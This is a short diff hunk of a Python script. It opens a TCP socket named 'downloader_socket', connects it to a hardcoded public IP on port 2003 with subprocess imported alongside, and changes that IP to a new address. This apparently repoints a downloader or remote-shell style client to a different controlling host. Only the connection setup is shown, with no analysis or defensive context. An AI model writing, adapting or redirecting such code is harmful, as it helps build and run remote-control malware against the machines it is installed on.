@@ -2,7 +2,7 @@ import socket
 import subprocess
 
 global ip,downloader_socket
-ip = "42.93.197.209"
+ip = "157.230.232.167"
 downloader_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 downloader_socket.connect((ip,2003))
 
